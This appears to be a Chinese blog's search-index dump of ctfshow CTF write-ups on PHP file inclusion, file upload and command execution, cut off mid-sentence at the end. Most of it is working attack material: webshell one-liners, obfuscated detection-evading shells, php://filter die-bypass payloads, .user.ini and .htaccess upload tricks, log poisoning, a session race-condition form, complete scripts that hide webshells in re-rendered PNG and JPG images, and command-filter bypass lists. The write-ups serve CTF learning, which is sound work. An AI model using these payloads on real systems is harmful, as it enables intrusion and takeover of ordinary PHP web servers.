所以PHP将会在服务器上创建一个文件：/tmp/sess_flag” 然后我们在PHP_SESSION_UPLOAD_PROGRESS下添加我们的执行代码，修改如下 因为我们在上面这个页面添加的ID值是flag，所以传参?file=/tmp/sess_flag,抓包 修改如下：这个a是随便加的，主要是为了方便爆破 两个包payload设置如下 条件竞争，将POST的包和传file的包都开启爆破，即可得到目录 修改传参内容，得到flag ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:5","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web82条件竞争"},{"categories":["CTF","web"],"content":"\r[web83]~[web86]web82的脚本都可以解 [web84] 方法与web82一样，虽然session被删除了，但请求线程比较多，刚删掉就又写进去了 [web85] 检查file的内容是否包含\u003c，web82脚本方法可行 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:6","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web83web86"},{"categories":["CTF","web"],"content":"\r[web87]bypass \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 21:57:55 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['file'])){ $file = $_GET['file']; $content = $_POST['content']; $file = str_replace(\"php\", \"???\", $file); $file = str_replace(\"data\", \"???\", $file); $file = str_replace(\":\", \"???\", $file); $file = str_replace(\".\", \"???\", $file); file_put_contents(urldecode($file), \"\u003c?php die('大佬别秀了');?\u003e\".$content); }else{ highlight_file(__FILE__); } ​ file_put_contents() 函数用于把字符串写入文件，成功返回写入到文件内数据的字节数，失败则返回 FALSE。 ​ file_get_contents() 把整个文件读入一个字符串中。 该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。 ​ 类似函数：fopen() 函数打开一个文件或 URL。区别是fopen()打开网页后，返回的不是字符串，不能直输出的，还需要用到fgets()这个函数来获取字符串。fgets()函数是从文件指针中读取一行。文件指针必须是有效的，必须指向由 fopen() 或 fsockopen() 成功打开的文件(并还未由 fclose() 关闭)。 死亡绕过： 原理不外乎是将死亡或者杂糅代码分解成php无法识别的代码 base64编码绕过利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别 base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。 当$content被加上了\u003c?php die('大佬别秀了');?\u003e以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符\u003c、?、;、\u003e、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpdie”和我们传入的其他字符 base64算法解码时是4个byte一组，所以给他增加2个“a”一共8个字符 “phpdieaa\"被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是\u003c?php die('大佬别秀了');?\u003e没有了。 file=php://filter/write=convert.base64-decode/resource=shell.php 对文件名进行url解码后再用file_put_contents写入，通过把p换成%2570（%2570—\u003e%70—\u003ep）绕过对php的过滤 file=%2570hp%253A%2F%2Ffilter%2Fwrite%3Dconvert%252Ebase64-decode%2Fresource%3Dshell%252E%2570hp 然后post发包 content=\u003c?php system($_GET[1]);?\u003e content=aaPD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg== 访问shell.php rce得到flag ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:7","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web87bypass"},{"categories":["CTF","web"],"content":"\r[web87]bypass \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-16 21:57:55 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['file'])){ $file = $_GET['file']; $content = $_POST['content']; $file = str_replace(\"php\", \"???\", $file); $file = str_replace(\"data\", \"???\", $file); $file = str_replace(\":\", \"???\", $file); $file = str_replace(\".\", \"???\", $file); file_put_contents(urldecode($file), \"\u003c?php die('大佬别秀了');?\u003e\".$content); }else{ highlight_file(__FILE__); } ​ file_put_contents() 函数用于把字符串写入文件，成功返回写入到文件内数据的字节数，失败则返回 FALSE。 ​ file_get_contents() 把整个文件读入一个字符串中。 该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。 ​ 类似函数：fopen() 函数打开一个文件或 URL。区别是fopen()打开网页后，返回的不是字符串，不能直输出的，还需要用到fgets()这个函数来获取字符串。fgets()函数是从文件指针中读取一行。文件指针必须是有效的，必须指向由 fopen() 或 fsockopen() 成功打开的文件(并还未由 fclose() 关闭)。 死亡绕过： 原理不外乎是将死亡或者杂糅代码分解成php无法识别的代码 base64编码绕过利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别 base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。 当$content被加上了\u003c?php die('大佬别秀了');?\u003e以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符\u003c、?、;、\u003e、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpdie”和我们传入的其他字符 base64算法解码时是4个byte一组，所以给他增加2个“a”一共8个字符 “phpdieaa\"被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是\u003c?php die('大佬别秀了');?\u003e没有了。 file=php://filter/write=convert.base64-decode/resource=shell.php 对文件名进行url解码后再用file_put_contents写入，通过把p换成%2570（%2570—\u003e%70—\u003ep）绕过对php的过滤 file=%2570hp%253A%2F%2Ffilter%2Fwrite%3Dconvert%252Ebase64-decode%2Fresource%3Dshell%252E%2570hp 然后post发包 content=\u003c?php system($_GET[1]);?\u003e content=aaPD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg== 访问shell.php rce得到flag ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:7","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#base64编码绕过"},{"categories":["CTF","web"],"content":"\r[web88]伪协议编码 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-09-17 02:27:25 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['file'])){ $file = $_GET['file']; if(preg_match(\"/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i\", $file)){ die(\"error\"); } include($file); }else{ highlight_file(__FILE__); } 对file的参数进行了过滤 可以使用php data协议?file=data://text/plain;base64, 来传入\u003c?php system('tac fl0g.php'); ?\u003e 传参的时候需要对php代码进行base64编码 编码后的字符串含有等于号，删掉就可以了 payload: http://65b019f9-acd9-46fa-afae-e470af533a11.challenge.ctf.show/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:8","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web88伪协议编码"},{"categories":["CTF","web"],"content":"\r[web116]web文件上传+misc mp4视频下载下来之后，放入010发现末尾又疑似png文件尾 顺势搜索png文件头89504E47 将这块数据摘取出来，得到php代码 浏览器页面无回显，通过bp抓包发现可以读取文件 ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:9","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web116"},{"categories":["CTF","web"],"content":"\r[web117]绕过die \u003c?php /* # -*- coding: utf-8 -*- # @Author: yu22x # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-10-01 18:16:59 */ highlight_file(__FILE__); error_reporting(0); function filter($x){ if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){ die('too young too simple sometimes naive!'); } } $file=$_GET['file']; $contents=$_POST['contents']; filter($file); file_put_contents($file, \"\u003c?php die();?\u003e\".$contents); 考察点：绕过死亡die 题目中过滤了很多协议和编码方式，但是除了我们常用的base64和rot13还是有很多方法可以绕过die的 支持的字符编码 php://filter的各种过滤器 可以使用 UCS-2LE UCS-2BE，将字符两位两位进行交换，可以在本地进行测试 payload: ?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=5.php post: post:contents=?\u003chp pvela$(P_SO[T]1;)\u003e? 然后读取flag （一开始把一句话木马写到flag.php里面把flag字符串覆盖掉了，到处早不到flag）QWQ……… ","date":"2023-11-17","objectID":"/ctfshow_file_include/:2:10","series":null,"tags":["CTF","web"],"title":"ctfshow_file_include","uri":"/ctfshow_file_include/#web117绕过die"},{"categories":["CTF","web"],"content":"ctfshow文件上传专题 ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:0:0","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#"},{"categories":["CTF","web"],"content":"\r总结：CTF中文件上传及文件包含总结 CTF文件上传漏洞总结 文件上传马儿总结： 短标签马儿： 一般的马儿： \u003c?php eval（$_POST['cmd']);?\u003e 没有PHP的马儿 \u003c?= eval（$_POST['cmd']);?\u003e \u003c? eval（$_POST['cmd']);?\u003e \u003c% eval（$_POST['cmd']);%\u003e 有PHP的马儿 \u003cscript language=\"php\"\u003e\u003c/script\u003e 特殊马儿： 过滤[]：用{}代替 \u003c?= eval（$_POST['cmd']);?\u003e 直接拿flag的变形马儿 \u003c? echo `tac /var/www/html/f*`;?\u003e \u003c? echo `tac /var/www/html/f*`?\u003e 免杀马儿： \u003c?php $a = \"s#y#s#t#e#m\"; $b = explode(\"#\",$a); $c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5]; $c($_REQUEST[1]); ?\u003e \u003c?php $a=substr('1s',1).'ystem'; $a($_REQUEST[1]); ?\u003e \u003c?php $a=substr('1s',1).'ystem'; $a($_REQUEST[1]); ?\u003e \u003c?php $a=substr('1s',1).'ystem'; $a($_REQUEST[1]); ?\u003e ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:1:0","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#总结"},{"categories":["CTF","web"],"content":"\r靶场题目：","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:0","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#靶场题目"},{"categories":["CTF","web"],"content":"\r[web151]前端校验文件类型前端校验文件类型，上传png图片马 再通过bp抓包修改文件后缀，蚁剑连接 修改后缀为php 蚁剑连接读flag ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:1","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web151前端校验文件类型"},{"categories":["CTF","web"],"content":"\r[web152]后端验证Content-Type后端验证实际上是验证Content-Type ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:2","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web152后端验证content-type"},{"categories":["CTF","web"],"content":"\r[web153].user.ini.user.ini 原理: 指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：require(./a.jpg);这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）所以要求当前目录必须要有php文件,巧合的是这题upload目录下有个index.php所以这种方式是可以成功的。 注： auto_append_file在木马文件上传后上传 auto_prepend_file在木马文件上传前上传 这道题按照前面两种方法无法上传 后面加了png头文件，php大写可以上传，但是蚁剑无法连接，用php3也不行 url上输入 /upload/ 显示了nothing here表示可以用配置文件（因为upload目录下有php文件） 以这样的方式上传，再改包，不然上传不了 然后直接上传写了一句话木马的png 上传成功后用蚁剑连接 http://1db86d8a-c57c-4b7f-b60c-2efd317295cc.challenge.ctf.show/upload/index.php 当然当我们再次访问/upload时： ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:3","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web153userini"},{"categories":["CTF","web"],"content":"\r[web154]短标签上题思路可解 如果带木马的不行，然后就更换短标签一个个试 \u003c?= eval($_POST[1]);?\u003e web155(内容过滤php)同上 ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:4","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web154短标签"},{"categories":["CTF","web"],"content":"\r[web156][]过滤过滤了文件内的[],可以改成{}来绕过 ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:5","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web156过滤"},{"categories":["CTF","web"],"content":"\r[web157]bypass经测试，对文件内容过滤了 php、[、{、 ; 上传.user.ini php 最后的语句也可以不加分号的，前提是得有 ?\u003e结束标志。 修改图片马的内容 \u003c?=system('ls ../')?\u003e 通过ls查看flag文件的位置，写入之后访问/upload/index.php查看回显 使用cat或tac读取信息 \u003c?=system('cat ../*')?\u003e web158思路同上 web159过滤了括号(),我们可以用反引号来代替system() \u003c?=`cat ../*`?\u003e ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:6","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web157bypass"},{"categories":["CTF","web"],"content":"\r[web160]bypass``过滤了反引号，我们可以包含日志 \u003c?=include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?\u003e 但发现 log也被过滤了，可以使用\"\"来拼接 尝试一句话木马UA头：\u003c?php eval($_POST[x]);?\u003e 上述UA头会引发报错，尝试\u003c?php system('ls');?\u003e 有预期回显，进一步修改： \u003c?php system('ls ../');?\u003e 确定flag.php的位置，tac读取flag \u003c?php system('tac ../flag.phpS');?\u003e ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:7","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web160bypass"},{"categories":["CTF","web"],"content":"\r[web161]检测文件头检测文件头 上传 GIF89a成功绕过 其余思路同上 ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:8","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web161检测文件头"},{"categories":["CTF","web"],"content":"\r[web162].bypass检测了文件头，同时过滤了点. session包含 **条件竞争：**我们上传的文件如果不符合要求，就会被删除，导致成功上传无法访问，没有用。但是如果我们上传的速度比服务器删的速度快，就可以了。 修改ini文件内容 .user.ini: GIF89a auto_prepend_file=a 随后修改并上传a文件： GIF89a \u003c?=include\"/tmp/sess_fllag\"?\u003e 构造，session文件竞争包含poc: \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003cbody\u003e \u003cform action=\"http://58b10a1f-08e0-4689-8b64-2e8641d2948b.chall.ctf.show/\" method=\"POST\" enctype=\"multipart/form-data\"\u003e \u003cinput type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"2333\" /\u003e \u003cinput type=\"file\" name=\"file\" /\u003e \u003cinput type=\"submit\" value=\"submit\" /\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e Cookie:PHPSESSID=fllag 2333\u003c?php $code='\u003c?php eval($_POST[1]);?\u003e;file_put_contents('a.php',$code);?\u003e 也可以远程包含自己vps上的马 ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:9","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web162bypass"},{"categories":["CTF","web"],"content":"\r[web164]PNG二次渲染PNG二次渲染 尝试上传图片，查看上传后的路径，存在文件包含 http://5b82c70e-ecd3-4ebb-9665-11ce8c1a5b74.challenge.ctf.show/download.php?image=32d3ca5e23f4ccf1e4c8660c40e75f33.png 这里用到一个工具： https://github.com/huntergregal/PNG-IDAT-Payload-Generator cmd命令： python generate.py -m php -p ma.php -o a.png 得到a.png可以上传 上传后再执行命令： get：\u00260=system post：1=tac flag.php 浏览器页面图片没有直接回显，下载图片也可以看到flag信息 另外还有php生成png二次渲染马的脚本，直接运行可生成png图片： \u003c?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y \u003c sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,'./1.png'); ?\u003e ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:10","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web164png二次渲染"},{"categories":["CTF","web"],"content":"\r[web165]JPG二次渲染JPG二次渲染 相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。 上传正常jpg图片后访问，抓包发到重放器中，发现图片经过二次渲染 与png图片二次渲染的区别在于，需要一张上传上去再下载下来的图片，然后跑脚本 php exp.php 1.jpg php脚本： \u003c?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php \u003cjpg_name.jpg\u003e In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \"\u003c?=eval(\\$_POST[1]);?\u003e\"; if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed'); } if(!isset($argv[1])) { die('php jpg_payload.php \u003cjpg_name.jpg\u003e'); } set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad \u003c 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-\u003ereadShort() != 0xFFD8) { die('Incorrect SOI marker'); } while((!$dis-\u003eeof()) \u0026\u0026 ($dis-\u003ereadByte() == 0xFF)) { $marker = $dis-\u003ereadByte(); $size = $dis-\u003ereadShort() - 2; $dis-\u003eskip($size); if($marker === 0xDA) { $startPos = $dis-\u003eseek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-\u003eeof())) { if($dis-\u003ereadByte() === 0xFF) { if($dis-\u003ereadByte !== 0x00) { break; } } } $stopPos = $dis-\u003eseek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage('payload_'.$argv[1], $outStream)) { die('Success!'); } else { break; } } } } unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-\u003ebinData = ''; $this-\u003eorder = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-\u003ebinData = file_get_contents($filename); } else { $this-\u003ebinData = $filename; } $this-\u003esize = strlen($this-\u003ebinData); } public function seek() { return ($this-\u003esize - strlen($this-\u003ebinData)); } public function skip($skip) { $this-\u003ebinData = substr($this-\u003ebinData, $skip); } public function readByte() { if($this-\u003eeof()) { die('End Of File'); } $byte = substr($this-\u003ebinData, 0, 1); $this-\u003ebinData = substr($this-\u003ebinData, 1); return ord($byte); } public function readShort() { if(strlen($this-\u003ebinData) \u003c 2)","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:11","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web165jpg二次渲染"},{"categories":["CTF","web"],"content":"\r[web166]zip只能上传zip，那我们就上传一个一句话的zip文件，然后用蚁剑连接 新建一个zip文件，后面插入一句话木马 \u003c?php eval(@$_POST['a']); ?\u003e 需要注意的是Content-Type为application/x-zip-compressed 可以用蚁剑直接连接http://28bac684-221f-4841-8c98-b81c4f551965.challenge.ctf.show:8080/upload/download.php?file=de9373c30bd8d73705a6d44209947715.zip ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:12","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web166zip"},{"categories":["CTF","web"],"content":"\r[web167].htaccess根据提示上传了包含shell的jpg文件,上传成功,点击下载文件,发现没有存在文件包含点,访问upload检查是否有可执行文件,提示没有权限,但是发现中间件是Apache .htaccess文件中写入 AddType application/x-httpd-php .jpg \u003c!-将jpg文件按照php文件解析--\u003e 或者写入 Sethandler application/x-httpd-php \u003c!-将该目录及子目录下的文件均按照php文件解析执行--\u003e 通过改包文件后缀名的方式上传.htaccess 随后上传带有一句话木马的jpg文件 hackbar命令执行或者蚁剑连接 ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:13","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web167htaccess"},{"categories":["CTF","web"],"content":"\r[web168]免杀马png改包为php，但需要免杀马 \u003c?php $bFIY=create_function(chr(25380/705).chr(92115/801).base64_decode('bw==').base64_decode('bQ==').base64_decode('ZQ=='),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode('YQ==').base64_decode('bA==').chr(060340/01154).chr(01041-0775).base64_decode('cw==').str_rot13('b').chr(01504-01327).base64_decode('ZQ==').chr(057176/01116).chr(0xe3b4/0x3dc));$bFIY(base64_decode('NjgxO'.'Tc7QG'.'V2QWw'.'oJF9Q'.''.str_rot13('G').str_rot13('1').str_rot13('A').base64_decode('VQ==').str_rot13('J').''.''.chr(0x304-0x2d3).base64_decode('Ug==').chr(13197/249).str_rot13('F').base64_decode('MQ==').''.'B1bnR'.'VXSk7'.'MjA0N'.'TkxOw'.'=='.''));?\u003e 蚁剑连接*****/upload/1.php 密码TyKPuntU 还有其他的免杀马： \u003c?php $a = \"s#y#s#t#e#m\"; $b = explode(\"#\",$a); $c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5]; $c($_REQUEST[1]); ?\u003e 再如： \u003c?php $a=$_REQUEST['a']; $b=$_REQUEST['b']; $a($b); ?\u003e 再如： \u003c?php $a=substr('1s',1).'ystem'; $a($_REQUEST[1]); ?\u003e ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:14","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web168免杀马"},{"categories":["CTF","web"],"content":"\r[web169]日志包含过滤了\u003c，无法执行PHP代码，于是考虑日志包含 前端限制必须上传zip，且file_content需修改为image/png 同时在user-agent中写入一句话木马，\u003c?php eval（$_POST['cmd']);?\u003e 随后上传一个.user.ini文件，auto_prepend_file=/var/log/nginx/access.log 再上传一个1.php文件，内容随便写，因为url/upload/目录下没有文件，所以需要写一个文件来承接.user.ini 接着就可以访问/url/upload/1.php，然后rce或者用蚁剑连接 ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:15","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web169日志包含"},{"categories":["CTF","web"],"content":"\r[web170]日志包含题解同上 ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:16","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web170日志包含"},{"categories":["CTF","web"],"content":"ctfshow命令/代码执行专题 ","date":"2023-11-17","objectID":"/ctfshow_rce/:0:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#"},{"categories":["CTF","web"],"content":"\r总结：","date":"2023-11-17","objectID":"/ctfshow_rce/:1:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#总结"},{"categories":["CTF","web"],"content":"\r文件读取可代替命令 more:一页一页的显示档案内容 less:与 more 类似 head:查看头几行 tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 tail:查看尾几行 nl：显示的时候，顺便输出行号 od:以二进制的方式读取档案内容 vi:一种编辑器，这个也可以查看 vim:一种编辑器，这个也可以查看 sort:可以查看 uniq:可以查看 file -f:报错出具体内容 rev:逆序查看 以及： curl file:///flag strings /flag uniq -c/etc/passwd bash -v /etc/passwd rev /etc/passwd ","date":"2023-11-17","objectID":"/ctfshow_rce/:2:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#文件读取可代替命令"},{"categories":["CTF","web"],"content":"\r空格绕过 \u003c \u003c\u003e //重定向符 %20 //(space) %09 //(tab) $IFS$9 ${IFS} //最好用这个 $IFS {cat,flag.txt} //在大括号中逗号可起分隔作用 ","date":"2023-11-17","objectID":"/ctfshow_rce/:3:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#空格绕过"},{"categories":["CTF","web"],"content":"\r编码绕过Base64编码 [root@kali flag123]# echo 'cat' | base64 Y2F0Cg== [root@kali flag123]# `echo 'Y2F0Cg==' | base64 -d` flag flag{suifeng} ","date":"2023-11-17","objectID":"/ctfshow_rce/:4:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#编码绕过"},{"categories":["CTF","web"],"content":"\r进制绕过16进制 [root~]# echo cat flag.txt | xxd 6361 7420 666c 6167 2e74 7874 0a [root~]# echo 6361 7420 666c 6167 2e74 7874 0a | xxd -r -p cat flag.txt [root~]# echo 6361 7420 666c 6167 2e74 7874 0a | xxd -r -p | bash 或 | sh flag{flag_is_here} [root~]# $(printf \"\\x63\\x61\\x74\\x20\\x66\\x6c\\x61\\x67\\x2e\\x74\\x78\\x74\") //cat flag.txt 16进制 flag{flag_is_here} 8进制 [root~]# $(printf \"\\143\\141\\164\\40\\146\\154\\141\\147\\56\\164\\170\\164\") flag{flag_is_here} ","date":"2023-11-17","objectID":"/ctfshow_rce/:5:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#进制绕过"},{"categories":["CTF","web"],"content":"\r分隔符过滤绕过 ?\u003e || %0a ","date":"2023-11-17","objectID":"/ctfshow_rce/:6:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#分隔符过滤绕过"},{"categories":["CTF","web"],"content":"\r符号绕过正则单双引号 ca''t flag.txt ca\"\"t flag.txt 跨行符'\\' ca\\t flag.txt $* ca$*t flag.txt $@ ca$@t flag.txt $x或${x} ca$3t flag.txt ca${3}t flag.txt ","date":"2023-11-17","objectID":"/ctfshow_rce/:7:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#符号绕过正则"},{"categories":["CTF","web"],"content":"\r通配符绕过正则 shell通配符有： * ：表示通配字符0次及以上 ? : 表示通配字符0或 ","date":"2023-11-17","objectID":"/ctfshow_rce/:8:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#通配符绕过正则"},{"categories":["CTF","web"],"content":"\r可以通配得到的命令base64： /bin/base64 可以通配为： /???/????64 作用为将文件以base64编码形式输出 bzip2： /usr/bin/bzip2 可以通配为： /???/???/????2 作用为将文件压缩成后缀为bz2的压缩文件 flag.php ==\u003e flag.php.bz2 ","date":"2023-11-17","objectID":"/ctfshow_rce/:8:1","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#可以通配得到的命令"},{"categories":["CTF","web"],"content":"\r字符串通配 flag.php ==\u003e flag.??? flag* …… 还可以通配来匹配命令，但需要全路径 例如： /bin/ca? 相当于cat命令 ","date":"2023-11-17","objectID":"/ctfshow_rce/:8:2","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#字符串通配"},{"categories":["CTF","web"],"content":"\r变量拼接绕过正则 以flag.php为例: x=lag;cat f$x.php 相当于: cat 